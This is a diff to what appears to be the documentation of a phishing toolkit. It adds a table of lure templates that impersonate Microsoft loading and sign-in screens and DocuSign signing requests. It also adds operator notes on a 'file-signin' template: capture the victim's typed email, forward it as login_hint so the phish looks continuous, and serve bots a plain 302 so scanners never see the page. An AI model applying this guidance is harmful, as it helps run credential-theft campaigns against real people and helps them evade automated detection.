@@ -193,6 +193,24 @@ The preview iframe refreshes as you type. Values are stored per page and applied
 serve time, so editing is instant (no file rewrite) and empty fields fall back to
 the template default.
 
+### Bundled templates
+
+| Template | Shape |
+|---|---|
+| `clean-redirect` | minimal page with a slim progress bar |
+| `ms-spinner` / `ms-loading` | Microsoft-flavoured loading screens |
+| `docusign-redirect` / `generic-signing` | "you have a document to sign" |
+| `doc-preview` / `file-viewer` | document preview / viewer chrome |
+| `generic-progress` | neutral progress page |
+| `file-signin` | two-step: a file "prepares", then the card flips to a Microsoft sign-in |
+
+**`file-signin` notes.** It collects the address the victim types and appends it to
+the target as `?login_hint=<email>`, so Microsoft prefills the field and the phish
+looks continuous. Point its target at the **lure path** (e.g.
+`https://login.<domain>/auth/login`): the engine forwards the query string across
+the lure → login redirect, so the hint reaches Microsoft intact. Bots still get a
+plain `302` and never render the page.
+
 ## 6. Config self-healing
 
 `ensureConfig()` runs on install, update and restart. It never overwrites a value
